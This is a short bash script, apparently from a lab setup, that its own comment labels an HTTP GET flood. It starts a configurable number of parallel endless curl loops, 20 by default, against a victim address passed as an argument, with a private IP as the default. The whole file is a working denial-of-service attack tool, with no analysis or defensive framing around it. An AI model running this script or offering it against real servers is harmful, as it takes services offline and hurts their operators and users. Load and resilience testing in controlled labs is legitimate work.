#!/bin/bash
# HTTP GET flood: N parallel request loops (tested with N=20)
VICTIM=${1:-172.30.0.10}; N=${2:-20}
for i in $(seq 1 "$N"); do (while true; do curl -s -o /dev/null "http://$VICTIM/"; done) & done
wait
